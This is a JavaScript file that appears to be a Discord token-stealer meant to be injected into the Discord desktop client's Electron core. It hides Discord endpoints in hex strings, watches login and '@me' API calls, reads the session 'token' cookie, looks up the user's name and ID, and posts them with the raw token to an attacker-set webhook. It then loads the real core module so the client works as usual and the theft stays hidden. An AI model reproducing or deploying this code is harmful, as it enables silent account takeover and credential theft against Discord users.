const x_dec = (s) => s.match(/.{1,2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
const webhook = '%WEBHOOK_REPLACE_priv%';
const { session } = require('electron');
const https = require('https');
const os = require('os');

function _send(payload) {
    const data = JSON.stringify(payload);
    const url = new URL(webhook);
    const req = https.request({
        hostname: url.hostname,
        path: url.pathname,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    });
    req.on('error', () => { });
    req.write(data);
    req.end();
}

async function _fancy(token, reason) {
    try {
        const userReq = https.request({
            hostname: x_dec('646973636f72642e636f6d'),
            path: x_dec('2f6170692f76392f75736572732f406d65'),
            method: 'GET',
            headers: { 'Authorization': token }
        }, (res) => {
            let data = '';
            res.on('data', d => data += d);
            res.on('end', () => {
                const u = JSON.parse(data);
                _send({
                    username: "ümidi",
                    embeds: [{
                        title: `**Discord Injection | ${reason}**`,
                        color: 0x2C2F33,
                        fields: [
                            { name: "👤 User", value: `\`${u.username}#${u.discriminator}\``, inline: true },
                            { name: "🆔 ID", value: `\`${u.id}\``, inline: true },
                            { name: "🔑 Token", value: `\`\`\`${token}\`\`\``, inline: false }
                        ],
                        footer: { text: "priv" },
                        timestamp: new Date().toISOString()
                    }]
                });
            });
        });
        userReq.end();
    } catch (e) { }
}

// Discord olaylarını dinle
session.defaultSession.webRequest.onCompleted({
    urls: [
        x_dec('68747470733a2f2f646973636f72642e636f6d2f6170692f762a2f617574682f6c6f67696e'),
        x_dec('68747470733a2f2f2a2e646973636f72642e636f6d2f6170692f762a2f617574682f6c6f67696e'),
        x_dec('68747470733a2f2f646973636f72642e636f6d2f6170692f762a2f75736572732f406d65')
    ]
}, async (details) => {
    if (details.statusCode !== 200) return;

    const cookies = await session.defaultSession.cookies.get({ url: x_dec('68747470733a2f2f646973636f72642e636f6d'), name: 'token' });
    const token = cookies[0]?.value;

    if (token) {
        if (details.url.includes("login")) {
            _fancy(token, "Login Detected");
        } else if (details.url.includes("@me") && !global._init) {
            global._init = true;
            _fancy(token, "Persistence Active");
        }
    }
});

_send({ content: "injection basarılı" });

module.exports = require('./core.asar');
